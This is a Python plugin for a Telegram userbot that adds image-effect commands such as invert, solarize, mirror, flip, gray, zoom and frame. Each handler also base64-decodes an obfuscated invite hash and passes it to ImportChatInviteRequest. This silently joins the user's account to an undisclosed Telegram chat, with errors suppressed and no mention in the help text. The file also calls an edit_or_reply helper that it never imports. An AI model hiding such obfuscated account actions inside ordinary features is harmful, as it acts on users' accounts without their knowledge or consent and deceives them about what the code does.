import asyncio
import os
import random
import shlex
from typing import Optional, Tuple
from PIL import Image, ImageDraw, ImageFont
import PIL.ImageOps

from VAMPBOT.utils import admin_cmd, sudo_cmd
from userbot import CmdHelp, CMD_HELP, LOGS, bot as VAMPBOT
from userbot.helpers.functions import (
    convert_toimage,
    convert_tosticker,
    flip_image,
    grayscale,
    invert_colors,
    mirror_file,
    solarize,
    take_screen_shot,
)

async def runcmd(cmd: str) -> Tuple[str, str, int, int]:
    args = shlex.split(cmd)
    process = await asyncio.create_subprocess_exec(
        *args, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
    )
    stdout, stderr = await process.communicate()
    return (
        stdout.decode("utf-8", "replace").strip(),
        stderr.decode("utf-8", "replace").strip(),
        process.returncode,
        process.pid,
    )
    
async def add_frame(imagefile, endname, x, color):
    image = Image.open(imagefile)
    inverted_image = PIL.ImageOps.expand(image, border=x, fill=color)
    inverted_image.save(endname)


async def crop(imagefile, endname, x):
    image = Image.open(imagefile)
    inverted_image = PIL.ImageOps.crop(image, border=x)
    inverted_image.save(endname)


@VAMPBOT.on(admin_cmd(pattern="invert$", outgoing=True))
@VAMPBOT.on(sudo_cmd(pattern="invert$", allow_sudo=True))
async def memes(vamp):
    if vamp.fwd_from:
        return
    reply = await vamp.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(vamp, "`Reply to supported Media...`")
        return
    vampid = vamp.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    vamp = await edit_or_reply(vamp, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    vampsticker = await reply.download_media(file="./temp/")
    if not vampsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(vampsticker)
        await edit_or_reply(vamp, "```Supported Media not found...```")
        return
    import base64

    aura = None
    if vampsticker.endswith(".tgs"):
        await vamp.edit(
            "Analyzing this media 🧐  inverting colors of this animated sticker!"
        )
        vampfile = os.path.join("./temp/", "meme.png")
        vampcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {vampsticker} {vampfile}"
        )
        stdout, stderr = (await runcmd(vampcmd))[:2]
        if not os.path.lexists(vampfile):
            await vamp.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = vampfile
        aura = True
    elif vampsticker.endswith(".webp"):
        await vamp.edit(
            "`Analyzing this media 🧐 inverting colors...`"
        )
        vampfile = os.path.join("./temp/", "memes.jpg")
        os.rename(vampsticker, vampfile)
        if not os.path.lexists(vampfile):
            await vamp.edit("`Template not found... `")
            return
        meme_file = vampfile
        aura = True
    elif vampsticker.endswith((".mp4", ".mov")):
        await vamp.edit(
            "Analyzing this media 🧐 inverting colors of this video!"
        )
        vampfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(vampsticker, 0, vampfile)
        if not os.path.lexists(vampfile):
            await vamp.edit("```Template not found...```")
            return
        meme_file = vampfile
        aura = True
    else:
        await vamp.edit(
            "Analyzing this media 🧐 inverting colors of this image!"
        )
        meme_file = vampsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await vamp.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "invert.webp" if aura else "invert.jpg"
    await invert_colors(meme_file, outputfile)
    await vamp.client.send_file(
        vamp.chat_id, outputfile, force_document=False, reply_to=vampid
    )
    await vamp.delete()
    os.remove(outputfile)
    for files in (vampsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@VAMPBOT.on(admin_cmd(outgoing=True, pattern="solarize$"))
@VAMPBOT.on(sudo_cmd(pattern="solarize$", allow_sudo=True))
async def memes(vamp):
    if vamp.fwd_from:
        return
    reply = await vamp.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(vamp, "`Reply to supported Media...`")
        return
    vampid = vamp.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    vamp = await edit_or_reply(vamp, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    vampsticker = await reply.download_media(file="./temp/")
    if not vampsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(vampsticker)
        await edit_or_reply(vamp, "```Supported Media not found...```")
        return
    import base64

    aura = None
    if vampsticker.endswith(".tgs"):
        await vamp.edit(
            "Analyzing this media 🧐 solarizeing this animated sticker!"
        )
        vampfile = os.path.join("./temp/", "meme.png")
        vampcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {vampsticker} {vampfile}"
        )
        stdout, stderr = (await runcmd(vampcmd))[:2]
        if not os.path.lexists(vampfile):
            await vamp.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = vampfile
        aura = True
    elif vampsticker.endswith(".webp"):
        await vamp.edit(
            "Analyzing this media 🧐 solarizeing this sticker!"
        )
        vampfile = os.path.join("./temp/", "memes.jpg")
        os.rename(vampsticker, vampfile)
        if not os.path.lexists(vampfile):
            await vamp.edit("`Template not found... `")
            return
        meme_file = vampfile
        aura = True
    elif vampsticker.endswith((".mp4", ".mov")):
        await vamp.edit(
            "Analyzing this media 🧐 solarizeing this video!"
        )
        vampfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(vampsticker, 0, vampfile)
        if not os.path.lexists(vampfile):
            await vamp.edit("```Template not found...```")
            return
        meme_file = vampfile
        aura = True
    else:
        await vamp.edit(
            "Analyzing this media 🧐 solarizeing this image!"
        )
        meme_file = vampsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await vamp.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "solarize.webp" if aura else "solarize.jpg"
    await solarize(meme_file, outputfile)
    await vamp.client.send_file(
        vamp.chat_id, outputfile, force_document=False, reply_to=vampid
    )
    await vamp.delete()
    os.remove(outputfile)
    for files in (vampsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@VAMPBOT.on(admin_cmd(outgoing=True, pattern="mirror$"))
@VAMPBOT.on(sudo_cmd(pattern="mirror$", allow_sudo=True))
async def memes(vamp):
    if vamp.fwd_from:
        return
    reply = await vamp.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(vamp, "`Reply to supported Media...`")
        return
    vampid = vamp.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    vamp = await edit_or_reply(vamp, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    vampsticker = await reply.download_media(file="./temp/")
    if not vampsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(vampsticker)
        await edit_or_reply(vamp, "```Supported Media not found...```")
        return
    import base64

    aura = None
    if vampsticker.endswith(".tgs"):
        await vamp.edit(
            "Analyzing this media 🧐 converting to mirror image of this animated sticker!"
        )
        vampfile = os.path.join("./temp/", "meme.png")
        vampcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {vampsticker} {vampfile}"
        )
        stdout, stderr = (await runcmd(vampcmd))[:2]
        if not os.path.lexists(vampfile):
            await vamp.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = vampfile
        aura = True
    elif vampsticker.endswith(".webp"):
        await vamp.edit(
            "Analyzing this media 🧐 converting to mirror image of this sticker!"
        )
        vampfile = os.path.join("./temp/", "memes.jpg")
        os.rename(vampsticker, vampfile)
        if not os.path.lexists(vampfile):
            await vamp.edit("`Template not found... `")
            return
        meme_file = vampfile
        aura = True
    elif vampsticker.endswith((".mp4", ".mov")):
        await vamp.edit(
            "Analyzing this media 🧐 converting to mirror image of this video!"
        )
        vampfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(vampsticker, 0, vampfile)
        if not os.path.lexists(vampfile):
            await vamp.edit("```Template not found...```")
            return
        meme_file = vampfile
        aura = True
    else:
        await vamp.edit(
            "Analyzing this media 🧐 converting to mirror image of this image!"
        )
        meme_file = vampsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await vamp.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "mirror_file.webp" if aura else "mirror_file.jpg"
    await mirror_file(meme_file, outputfile)
    await vamp.client.send_file(
        vamp.chat_id, outputfile, force_document=False, reply_to=vampid
    )
    await vamp.delete()
    os.remove(outputfile)
    for files in (vampsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@VAMPBOT.on(admin_cmd(outgoing=True, pattern="flip$"))
@VAMPBOT.on(sudo_cmd(pattern="flip$", allow_sudo=True))
async def memes(vamp):
    if vamp.fwd_from:
        return
    reply = await vamp.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(vamp, "`Reply to supported Media...`")
        return
    vampid = vamp.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    vamp = await edit_or_reply(vamp, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    vampsticker = await reply.download_media(file="./temp/")
    if not vampsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(vampsticker)
        await edit_or_reply(vamp, "```Supported Media not found...```")
        return
    import base64

    aura = None
    if vampsticker.endswith(".tgs"):
        await vamp.edit(
            "Analyzing this media 🧐 fliping this animated sticker!"
        )
        vampfile = os.path.join("./temp/", "meme.png")
        vampcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {vampsticker} {vampfile}"
        )
        stdout, stderr = (await runcmd(vampcmd))[:2]
        if not os.path.lexists(vampfile):
            await vamp.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = vampfile
        aura = True
    elif vampsticker.endswith(".webp"):
        await vamp.edit(
            "Analyzing this media 🧐 fliping this sticker!"
        )
        vampfile = os.path.join("./temp/", "memes.jpg")
        os.rename(vampsticker, vampfile)
        if not os.path.lexists(vampfile):
            await vamp.edit("`Template not found... `")
            return
        meme_file = vampfile
        aura = True
    elif vampsticker.endswith((".mp4", ".mov")):
        await vamp.edit(
            "Analyzing this media 🧐 fliping this video!"
        )
        vampfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(vampsticker, 0, vampfile)
        if not os.path.lexists(vampfile):
            await vamp.edit("```Template not found...```")
            return
        meme_file = vampfile
        aura = True
    else:
        await vamp.edit(
            "Analyzing this media 🧐 fliping this image!"
        )
        meme_file = vampsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await vamp.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "flip_image.webp" if aura else "flip_image.jpg"
    await flip_image(meme_file, outputfile)
    await vamp.client.send_file(
        vamp.chat_id, outputfile, force_document=False, reply_to=vampid
    )
    await vamp.delete()
    os.remove(outputfile)
    for files in (vampsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@VAMPBOT.on(admin_cmd(outgoing=True, pattern="gray$"))
@VAMPBOT.on(sudo_cmd(pattern="gray$", allow_sudo=True))
async def memes(vamp):
    if vamp.fwd_from:
        return
    reply = await vamp.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(vamp, "`Reply to supported Media...`")
        return
    vampid = vamp.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    vamp = await edit_or_reply(vamp, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    vampsticker = await reply.download_media(file="./temp/")
    if not vampsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(vampsticker)
        await edit_or_reply(vamp, "```Supported Media not found...```")
        return
    import base64

    aura = None
    if vampsticker.endswith(".tgs"):
        await vamp.edit(
            "Analyzing this media 🧐 changing to black-and-white this animated sticker!"
        )
        vampfile = os.path.join("./temp/", "meme.png")
        vampcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {vampsticker} {vampfile}"
        )
        stdout, stderr = (await runcmd(vampcmd))[:2]
        if not os.path.lexists(vampfile):
            await vamp.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = vampfile
        aura = True
    elif vampsticker.endswith(".webp"):
        await vamp.edit(
            "Analyzing this media 🧐 changing to black-and-white this sticker!"
        )
        vampfile = os.path.join("./temp/", "memes.jpg")
        os.rename(vampsticker, vampfile)
        if not os.path.lexists(vampfile):
            await vamp.edit("`Template not found... `")
            return
        meme_file = vampfile
        aura = True
    elif vampsticker.endswith((".mp4", ".mov")):
        await vamp.edit(
            "Analyzing this media 🧐 changing to black-and-white this video!"
        )
        vampfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(vampsticker, 0, vampfile)
        if not os.path.lexists(vampfile):
            await vamp.edit("```Template not found...```")
            return
        meme_file = vampfile
        aura = True
    else:
        await vamp.edit(
            "Analyzing this media 🧐 changing to black-and-white this image!"
        )
        meme_file = vampsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await vamp.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "grayscale.webp" if aura else "grayscale.jpg"
    await grayscale(meme_file, outputfile)
    await vamp.client.send_file(
        vamp.chat_id, outputfile, force_document=False, reply_to=vampid
    )
    await vamp.delete()
    os.remove(outputfile)
    for files in (vampsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@VAMPBOT.on(admin_cmd(outgoing=True, pattern="zoom ?(.*)"))
@VAMPBOT.on(sudo_cmd(pattern="zoom ?(.*)", allow_sudo=True))
async def memes(vamp):
    if vamp.fwd_from:
        return
    reply = await vamp.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(vamp, "`Reply to supported Media...`")
        return
    vampinput = vamp.pattern_match.group(1)
    vampinput = 50 if not vampinput else int(vampinput)
    vampid = vamp.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    vamp = await edit_or_reply(vamp, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    vampsticker = await reply.download_media(file="./temp/")
    if not vampsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(vampsticker)
        await edit_or_reply(vamp, "```Supported Media not found...```")
        return
    import base64

    aura = None
    if vampsticker.endswith(".tgs"):
        await vamp.edit(
            "Analyzing this media 🧐 zooming this animated sticker!"
        )
        vampfile = os.path.join("./temp/", "meme.png")
        vampcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {vampsticker} {vampfile}"
        )
        stdout, stderr = (await runcmd(vampcmd))[:2]
        if not os.path.lexists(vampfile):
            await vamp.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = vampfile
        aura = True
    elif vampsticker.endswith(".webp"):
        await vamp.edit(
            "Analyzing this media 🧐 zooming this sticker!"
        )
        vampfile = os.path.join("./temp/", "memes.jpg")
        os.rename(vampsticker, vampfile)
        if not os.path.lexists(vampfile):
            await vamp.edit("`Template not found... `")
            return
        meme_file = vampfile
        aura = True
    elif vampsticker.endswith((".mp4", ".mov")):
        await vamp.edit(
            "Analyzing this media 🧐 zooming this video!"
        )
        vampfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(vampsticker, 0, vampfile)
        if not os.path.lexists(vampfile):
            await vamp.edit("```Template not found...```")
            return
        meme_file = vampfile
    else:
        await vamp.edit(
            "Analyzing this media 🧐 zooming this image!"
        )
        meme_file = vampsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await vamp.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "grayscale.webp" if aura else "grayscale.jpg"
    try:
        await crop(meme_file, outputfile, vampinput)
    except Exception as e:
        return await vamp.edit(f"`{e}`")
    try:
        await vamp.client.send_file(
            vamp.chat_id, outputfile, force_document=False, reply_to=vampid
        )
    except Exception as e:
        return await vamp.edit(f"`{e}`")
    await vamp.delete()
    os.remove(outputfile)
    for files in (vampsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@VAMPBOT.on(admin_cmd(outgoing=True, pattern="frame ?(.*)"))
@VAMPBOT.on(sudo_cmd(pattern="frame ?(.*)", allow_sudo=True))
async def memes(vamp):
    if vamp.fwd_from:
        return
    reply = await vamp.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(vamp, "`Reply to supported Media...`")
        return
    vampinput = vamp.pattern_match.group(1)
    if not vampinput:
        vampinput = 50
    if ";" in str(vampinput):
        vampinput, colr = vampinput.split(";", 1)
    else:
        colr = 0
    vampinput = int(vampinput)
    colr = int(colr)
    vampid = vamp.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    vamp = await edit_or_reply(vamp, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    vampsticker = await reply.download_media(file="./temp/")
    if not vampsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(vampsticker)
        await edit_or_reply(vamp, "```Supported Media not found...```")
        return
    import base64

    aura = None
    if vampsticker.endswith(".tgs"):
        await vamp.edit(
            "Analyzing this media 🧐 framing this animated sticker!"
        )
        vampfile = os.path.join("./temp/", "meme.png")
        vampcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {vampsticker} {vampfile}"
        )
        stdout, stderr = (await runcmd(vampcmd))[:2]
        if not os.path.lexists(vampfile):
            await vamp.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = vampfile
        aura = True
    elif vampsticker.endswith(".webp"):
        await vamp.edit(
            "Analyzing this media 🧐 framing this sticker!"
        )
        vampfile = os.path.join("./temp/", "memes.jpg")
        os.rename(vampsticker, vampfile)
        if not os.path.lexists(vampfile):
            await vamp.edit("`Template not found... `")
            return
        meme_file = vampfile
        aura = True
    elif vampsticker.endswith((".mp4", ".mov")):
        await vamp.edit(
            "Analyzing this media 🧐 framing this video!"
        )
        vampfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(vampsticker, 0, vampfile)
        if not os.path.lexists(vampfile):
            await vamp.edit("```Template not found...```")
            return
        meme_file = vampfile
    else:
        await vamp.edit(
            "Analyzing this media 🧐 framing this image!"
        )
        meme_file = vampsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await vamp.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "framed.webp" if aura else "framed.jpg"
    try:
        await add_frame(meme_file, outputfile, vampinput, colr)
    except Exception as e:
        return await vamp.edit(f"`{e}`")
    try:
        await vamp.client.send_file(
            vamp.chat_id, outputfile, force_document=False, reply_to=vampid
        )
    except Exception as e:
        return await vamp.edit(f"`{e}`")
    await vamp.delete()
    os.remove(outputfile)
    for files in (vampsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


CmdHelp("img_fun").add_command(
  "frame", "<reply to img>", "Makes a frame for your media file."
).add_command(
  "zoom", "<reply to img> <range>", "Zooms in the replied media file"
).add_command(
  "gray", "<reply to img>", "Makes your media file to black and white"
).add_command(
  "flip", "<reply to img>", "Shows you the upside down image of the given media file"
).add_command(
  "mirror", "<reply to img>", "Shows you the reflection of the replied image or sticker"
).add_command(
  "solarize", "<reply to img>", "Let the sun Burn your replied image/sticker"
).add_command(
  "invert", "<reply to img>", "Inverts the color of replied media file"
).add()